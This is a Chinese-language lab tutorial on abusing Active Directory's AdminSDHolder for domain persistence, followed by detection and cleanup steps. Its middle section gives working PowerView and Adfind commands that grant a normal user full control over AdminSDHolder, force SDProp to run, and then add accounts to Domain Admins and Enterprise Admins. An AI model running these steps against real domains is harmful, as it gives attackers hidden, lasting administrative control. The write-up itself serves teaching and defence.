# AdminSDHolder 滥用

活动目录域服务使用AdminSDHolder、Protected Groups 和 Security Descriptor Propagator
来保护特权用户和特权组被恶意的修改或滥用。这个功能是在Windows 2000
服务器活动目录的第一个版本中引入的，目的是保护特定对象不会被恶意修改，但也给攻击者进行域权限维持留了一个好的隐蔽方案。

## Protected Groups

自 Windows 2000 服务器中首次方法活动目录以来，Protected Groups（受保护组）的概念就一直存在。  
Protected Groups指活动目录内置的一些特权对象。

Protected Groups的列表由Windows 2000 Server中的4个安全组（Administrators、Domain
Admins、Enterprise Admins、Schema Admins）组成。在 Windows 2000 Server SP4 和 Windows
Server 2003中还添加了其他几个组，包括管理员和Krbtgt账户。在带有SP1及更高版本的Windows Server 2008、Windows
Server 2008 R2、Windows Server 2012 R2、Windows Server 2016 R2的版本中，微软扩展了这个列表，增加了
Read-only Domain Controllers组。在Windows Server 2019 R2 的版本中，微软再次扩展了这个列表，增加了 Key
Admins和Enterprise Key Admins 组。

Protected Groups的对象会将admin-inCount值设为1，因此可以用该值来过滤活动目录Protected
Groups的对象列表。使用Adfind执行如下的命令查询 Protected Groups对象的列表，效果如图所示：

    
    
    Adfind.exe -b dc=hack,dc=com -f adminCount=1" dn
    

![图片.png](https://image.3001.net/images/20230619/1687166200_64901cf8d811733e86cc0.png!small)

也可以使用PowerSplit中的PowerView.ps1脚本执行如下的命令枚举AdminCount值为1的对象，结果如图所示：

    
    
    #枚举AdminCount 值为1的账户
    Import-Module .\PowerView.ps1;Get-NetUser -Admincount | select name
    #枚举AdminCount 值为1的组
    Import-Module .\PowerView.ps1;Get-NetGroup -Admincount
    

![图片.png](https://image.3001.net/images/20230619/1687166223_64901d0faaea806bc3b94.png!small)

## AdminSDHolder

每个活动目录域都有一个名为AdminSDHolder的容器对象，它的存储路径为：CN=AdminSDHolder,CN=System,DC=hack,DC=com

AdminSDHolder对象具有唯一的ACL，用于控制Protected Groups
的安全主体的权限，以避免这些特权对象被恶意修改或滥用。可以理解为AdminSDHolder的ACL配置是一个安全的配置模板。AdminSDHolder对象默认情况下禁用继承，确保不继承父级权限。默认情况下，只有Administrators、Domain
Admins 和 Enterprise Admins 组拥有对AdminSDHoler对象属性的修改权限。

## Security Descriptor Propagater

默认情况下，每隔一小时在持有模拟器操作主角色的域控上运行一个SDProp（Security Descriptor
Propagation）后台进程。SDProp进程并不知道哪些对象是在Protected
Groups中，它只能根据目标对象的AdminCount属性是否为1来判断目标对象是否受保护的，然后将这些对象的ACL与AdminSDHolder对象的ACL进行比较。如果是受保护对象的ACL配置与AdminSDHolder容器的ACL配置不一致，SDProp进程将重写该收保护对象的ACL，使其恢复与AdminSDHolder容器相同的ACL配置。

## 利用AdminSDHolder实现权限维持

实验环境如下：

  * 域管理员：hack\administrator

  * 域普通用户：hack\jack

由于用户jack是域普通用户，因此它没有给Domian Admins组中添加用户的权限，如图所示，当用户jack尝试给Domain Admins
组中添加用户时，提示权限拒绝。

    
    
    net group "domain admins" hack2 /add /domain
    

![图片.png](https://image.3001.net/images/20230619/1687166242_64901d22c719fbc59b363.png!small)

现在我们获得了域管理员的权限，并想利用AdminSDHolder进行权限维持，可以进行如下的操作：修改AdminSDHolder对象的ACL配置，使得普通域用户jack对其拥有完全控制权的权限可以使用Empire下的powerview.ps1脚本执行如下的命令进行修改，如图所示：

    
    
    Import-Module .\powerview.ps1
    #添加用户jack对AdminSDHolder的安全控制权限
    Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=hack,DC=com" -PrincipalIdentity jack -Rights ALL -Verbose
    

![图片.png](https://image.3001.net/images/20230619/1687166258_64901d322a4620cebce1a.png!small)

执行如下的命令查询AdminSDHolder的ACL配置，如图所示，可以看到用户jack已经对AdminSDHolder拥有安全控制权限了

    
    
    #查询AdminSDHolder的ACL配置
    Adfind.exe -s base -b "CN=AdminSDHoler,CN=System,DC=hack,DC=com" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;;;hack\jack
    

![图片.png](https://image.3001.net/images/20230619/1687166270_64901d3ed777f80eebe67.png!small)

等待SDProp进程运行，或者也可以使用Invoke-ADSDPropagation.ps1脚本手动触发SDProp进程运行。SDProp进程运行时，会以AdminSDHolder的ACL为模板对受保护的对象的ACL进行检查。发现两者的ACL不一致，SDProp进程将重写受保护对象的ACL，使其恢复与AdminSDHolder容器相同的ACL配置。因此，最终我们控制的用户jack将会对所有受保护的对象均拥有完全控制的权限。

使用 Invoke-ADSDPropagation.ps1脚本执行如下的命令手动触发SDProp进程运行，如图所示：

脚本下载：`https://github.com/edemilliere/ADSI`

    
    
    #使用Invoke-ADSDPropagation.ps1脚本触发SDProp运行
    Import-Module .\Invoke-ADSDPropagation.ps1;
    Invoke-ADSDPropagation -TaskName runProtectAdminGroupsTask
    

![图片.png](https://image.3001.net/images/20230619/1687166288_64901d502c5ffc24c40f7.png!small)  
SDProp进程运行完成后，使用Adfind执行如下的命令查询用户jack是否对Domain Admins组、Enterprise Admins
组和域管理员administrator 等受保护对象的具有完全控制权限，结果如图所示：

    
    
    #检查用户jack对Domain Admins 组是否具有完全控制权限
    Adfind.exe -s base -b "CN=Domain Admins,CN=Users,DC=hack,DC=com" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;;;hack\jack
    #检查用户jack对Enterprise Admins 组是否具有完全控制权限
    Adfind.exe -s base -b "CN=Enterprise Admins,CN=Users,DC=hack,DC=com" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;;;hack\jack
    #检查用户jack对y域管理员administrator是否具有完全控制权限
    Adfind.exe -s base -b "CN=Administrator,CN=Users,DC=hack,DC=com" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;;;hack\jack
    

![图片.png](https://image.3001.net/images/20230619/1687166308_64901d642e557bff227f4.png!small)

也可以图形化查看ACL，如图所示，可以看到用户jack对Domain Admins组具有完全控制权限

![图片.png](https://image.3001.net/images/20230619/1687166325_64901d753cf1e78866615.png!small)

再次以用户jack身份往Domain Admins和Enterprise Admins组中添加用户，如图所示，可以看到，赋予权限后，用户添加成功：

    
    
    net group "domain admins" hack2 /add /domain
    net group "Enterprise admins" hack2 /add /domain
    

![图片.png](https://image.3001.net/images/20230619/1687166354_64901d9218291430cdde6.png!small)

## AdminSDHolder 滥用检测和防御

对于防守方和蓝方来说，如何针对AdminSDHolder 滥用进行检测和防御呢？

使用Adfind执行如下的命令查询AdminSDHolder
的ACL查看是否有可疑的用户对其拥有不正常的权限，如图所示，可以看到用户jack对其拥有不正常权限

    
    
    #查询AdminSDHolder 的ACL
    Adfind.exe -s base -b "CN=AdminSDHoler,CN=System,DC=hack,DC=com" nTSecurityDescriptor -sddl+++ 
    

![图片.png](https://image.3001.net/images/20230619/1687166371_64901da31a936fd455733.png!small)

也可以使用PowerSploit下的powerview.ps1脚本执行如下的命令进行查询，如图所示：

    
    
    Import-Module .\powerview.ps1
    #查询AdminSDHoler具有完全控制的权限
    Get-ObjectAcl -ADSprefix "CN=AdminSDHoler,CN=System" | select IdentiyReference
    

如果想移除用户jack对AdminSDHoler的完全控制权限，可以使用powerview.ps1脚本执行如下的命令，结果如图所示，但还是需要等待SDProp运行完成后，用户jack对受保护对象的完全控制权限才会移除。

    
    
    Import-Module .\powerview.ps1
    #移除用户jackAdminSDHoler具有完全控制的权限
    Remove-DomainObjectAcl -TargetIdentity "CN=AdminSDHoler,CN=System,DC=hack,DC=com" -PrincipalIdentity jack -Rights All -Verbose
    

![图片.png](https://image.3001.net/images/20230619/1687166386_64901db246561cf81b591.png!small)

